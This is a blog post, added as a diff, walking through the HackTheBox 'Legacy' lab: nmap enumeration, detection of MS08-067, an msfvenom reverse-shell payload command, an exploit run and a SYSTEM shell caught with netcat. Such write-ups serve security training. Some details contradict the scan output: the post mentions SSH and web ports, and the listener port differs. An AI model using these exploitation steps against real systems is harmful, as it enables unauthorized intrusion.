@@ -1,0 +1,354 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Acruxlare | HackTheBox - Legacy</title>
+  <meta name="description" content="Walkthrough of Legacy box on Hackthebox.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="HackTheBox - Legacy">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://fumenoid.github.io/posts/hackthebox-legacy">
+  <meta property="og:description" content="Walkthrough of Legacy box on Hackthebox.">
+  <meta property="og:site_name" content="Acruxlare">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://fumenoid.github.io/posts/hackthebox-legacy">
+  <meta name="twitter:title" content="HackTheBox - Legacy">
+  <meta name="twitter:description" content="Walkthrough of Legacy box on Hackthebox.">
+
+  
+    
+      <meta property="og:image" content="https://fumenoid.github.io/assets/documentation/legacythumb-b1452cd64eceac400e60b54e6fc489d7158793fcdcf6d7c11cbbe6eace6fdb5f.png">
+      <meta property="og:image:height" content="286">
+      <meta property="og:image:width" content="507">
+      <meta name="twitter:image" content="https://fumenoid.github.io/assets/documentation/legacythumb-b1452cd64eceac400e60b54e6fc489d7158793fcdcf6d7c11cbbe6eace6fdb5f.png">
+      <meta name="twitter:card" content="summary_large_image">
+    
+  
+
+  <link href="https://fumenoid.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="Acruxlare Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-dark-f46876861f8611b1be1e40dbc82954f6ce18e041809dce43ba85794a93ef72e2.ico">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
+      <link rel="stylesheet" type="text/css" href="/assets/dark-831218bc9e41aef39ee6a0bae4501195bccafcc13101ae2b9cd20493a6ec04c0.css">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="Acruxlare">Acruxlare</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/fumenoid" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/fumenoid" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:fumenoid@gmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/forensics">Forensics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/programming">Programming</a></li>
+    
+      
+        <li><a href="/tag/sorcery">Sorcery</a></li>
+    
+      
+        <li><a href="/tag/tryhackme">Tryhackme</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>HackTheBox - Legacy</h1>
+            <p>Walkthrough of Legacy box on Hackthebox.</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    November 2, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      4 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'hackthebox'">hackthebox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/documentation/legacy-0f9012494a7b43ae0ac7d0c7c8e39e116429ea8e0c07108d25a26430901785cc.webp">
+  <img src="/assets/documentation/legacy-0f9012494a7b43ae0ac7d0c7c8e39e116429ea8e0c07108d25a26430901785cc.webp" alt="HTB Legacy" class="zooming" data-rjs="/assets/documentation/legacy-0f9012494a7b43ae0ac7d0c7c8e39e116429ea8e0c07108d25a26430901785cc.webp" data-zooming-width="800" data-zooming-height="507" />
+</a></p>
+
+<h2 id="htb---legacy">HTB - Legacy</h2>
+
+<p>IP - 10.10.10.4</p>
+
+<h3 id="overview">Overview</h3>
+
+<p>This box was an easy level windows box on HTB created by <a href="https://www.hackthebox.eu/home/users/profile/1">ch4p</a>, it started with finding that the box is running a vulnerable <code class="highlighter-rouge">samba server</code> and the OS version of the box, then we use <code class="highlighter-rouge">ms08-067 exploit</code> to get a shell on the box.</p>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>As always let’s start off with nmap script nmap -sC for default scripts <del>Alright, if it isn’t obvious yet I am a IPPSEC fanboi.</del> Aight, firing up nmap to scan all open ports on the box.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Legacy]
+└──╼ <span class="nv">$sudo</span> nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-o</span> nmap/initial 10.10.10.4</code></pre></figure>
+
+<p>And here is our nmap result</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Nmap scan report <span class="k">for </span>10.10.10.4
+Host is up <span class="o">(</span>0.084s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 filtered ports
+PORT     STATE  SERVICE       VERSION
+139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open   microsoft-ds  Windows XP microsoft-ds
+3389/tcp closed ms-wbt-server
+Service Info: OSs: Windows, Windows XP<span class="p">;</span> CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+|_clock-skew: mean: <span class="nt">-3h58m16s</span>, deviation: 1h24m50s, median: <span class="nt">-4h58m16s</span>
+|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:cc:9c <span class="o">(</span>VMware<span class="o">)</span>
+| smb-os-discovery: 
+|   OS: Windows XP <span class="o">(</span>Windows 2000 LAN Manager<span class="o">)</span>
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY<span class="se">\x</span>00
+|   Workgroup: HTB<span class="se">\x</span>00
+|_  System <span class="nb">time</span>: 2020-11-02T08:38:51+02:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+|_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>71.92 seconds</code></pre></figure>
+
+<p>Open services SSH on port 22 and webserver on port 80. As there aren’t many attacks possible on ssh so I am gonna shift my focus on the web server.</p>
+
+<h4 id="foothold">Foothold</h4>
+
+<p>The nmap is detecting OS version, <code class="highlighter-rouge">Windows XP</code>. Windows XP is pretty old and so the services running probably have some vulnerability. Samba seems like our attack vector so let’s enumerate Samba.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Legacy]
+└──╼ <span class="nv">$nmap</span> <span class="nt">-Pn</span> <span class="nt">--script</span> smb-vuln<span class="k">*</span> <span class="nt">-p</span> 445 <span class="nt">-o</span> nmap/smb_scan 10.10.10.4
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-11-02 15:24 IST
+Nmap scan report <span class="k">for </span>10.10.10.4
+Host is up <span class="o">(</span>0.086s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution <span class="o">(</span>MS08-067<span class="o">)</span>
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service <span class="k">in </span>Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure <span class="nb">date</span>: 2008-10-23
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2008-4250
+|_smb-vuln-ms10-054: <span class="nb">false</span>
+|_smb-vuln-ms10-061: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability <span class="k">in </span>Microsoft SMBv1 servers <span class="o">(</span>ms17-010<span class="o">)</span>
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk <span class="nb">factor</span>: HIGH
+|       A critical remote code execution vulnerability exists <span class="k">in </span>Microsoft SMBv1
+|        servers <span class="o">(</span>ms17-010<span class="o">)</span><span class="nb">.</span>
+|           
+|     Disclosure <span class="nb">date</span>: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-0143
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.23 seconds</code></pre></figure>
+
+<p>And seems like the smb server is vulnerable to <code class="highlighter-rouge">smb-vuln-ms08-067</code>.</p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>After Searching a bit, I reached this <a href="https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py">ms08-067 python exploit</a>.</p>
+
+<p>The exploit script requires three arguments, target box IP, the port of vulnerable service and the OS info from a list of [1-8] menu it present to us. <code class="highlighter-rouge">6</code> option is for <code class="highlighter-rouge">Windows XP English</code> so I will be trying that first tho before that, we need to create a payload to get a reverse shell using <code class="highlighter-rouge">msfvenom</code> and replace it with the shellcode in the <code class="highlighter-rouge">exploit</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Legacy]
+└──╼ <span class="nv">$msfvenom</span> <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.33 <span class="nv">LPORT</span><span class="o">=</span>9889 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">40"</span> <span class="nt">-f</span> c <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows</code></pre></figure>
+
+<p>Replace the shell code in the script and start a netcat listner using <code class="highlighter-rouge">rlwrap nc -lvnp 9889</code>. Note : If this exploit fails better reset the box.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Legacy]
+└──╼ <span class="nv">$python</span> ms09-067.py 10.10.10.4 6 9889
+<span class="c">#######################################################################</span>
+<span class="c">#   MS08-067 Exploit</span>
+<span class="c">#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).</span>
+<span class="c">#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi</span>
+<span class="o">[</span>REDACTED]
+Windows XP SP3 English <span class="o">(</span>NX<span class="o">)</span>
+
+<span class="o">[</span>-]Initiating connection
+<span class="o">[</span>-]connected to ncacn_np:10.10.10.4[<span class="se">\p</span>ipe<span class="se">\b</span>rowser]
+Exploit finish</code></pre></figure>
+
+<p>Checking our <code class="highlighter-rouge">netcat</code> listner.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Legacy]
+└──╼ <span class="nv">$rlwrap</span> nc <span class="nt">-lvnp</span> 9889
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>fumenoid: 
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.33] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.4] 1028
+Microsoft Windows XP <span class="o">[</span>Version 5.1.2600]
+<span class="o">(</span>C<span class="o">)</span> Copyright 1985-2001 Microsoft Corp.
+
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
+NT Authority<span class="se">\S</span>ystem</code></pre></figure>
+
+<p>Now we can read both <code class="highlighter-rouge">user.txt</code> and <code class="highlighter-rouge">root.txt</code>.</p>
+
+<h6 id="hope-you-learned-something-new-if-you-face-any-issues--have-any-query-feel-free-to-contact-me-on-social-media">Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.</h6>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/intent/tweet?url=https://fumenoid.github.io/posts/hackthebox-legacy&via=fumenoid&text=HackTheBox - Legacy : Walkthrough of Legacy box on Hackthebox." title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://fumenoid.github.io/posts/hackthebox-legacy" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    Happy Hacking :D
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-172959519-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-172959519-1');
+  </script>
+
+
+<script src="/assets/vendor-130c9c254effc51f3283620bc635851da7b99c20901216948f11ba72ee13317f.js" type="text/javascript"></script>
+
+
+  <script src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js" type="text/javascript"></script>
+
+
+
+  <script src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js" type="text/javascript"></script>
+
+
+<script src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js" type="text/javascript"></script>
+
+
+</body>
+</html>
